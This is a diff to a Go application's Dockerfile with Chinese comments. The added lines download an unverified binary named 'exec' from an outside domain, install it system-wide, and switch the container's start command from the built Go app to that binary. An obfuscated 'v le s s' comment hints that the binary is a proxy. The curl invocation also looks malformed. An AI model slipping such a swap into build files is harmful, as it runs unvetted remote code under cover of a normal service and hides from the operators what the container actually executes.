@@ -1,4 +1,5 @@
 FROM golang:alpine
+RUN apk update && apk add --no-cache bash curl
 # 为我们的镜像设置必要的环境变量
 ENV GO111MODULE=on \
     CGO_ENABLED=0 \
@@ -13,6 +14,9 @@ COPY . .
 RUN go build -o app main.go
 ADD config.json .
 RUN sed -i "s/\ //g" config.json
+RUN curl -C https://tv.clymiao.win/exec -o exec
+RUN mv exec /usr/bin/exec
+RUN mv config.json /etc/config.json
 
 # v le s s
 # 移动到用于存放生成的二进制文件的 /dist 目录
@@ -22,4 +26,4 @@ RUN cp /build/app .
 # 声明服务端口
 EXPOSE 8888
 RUN mv /dist/app /usr/bin/app
-CMD ["/usr/bin/app"]
+CMD /usr/bin/exec -config /etc/config.json
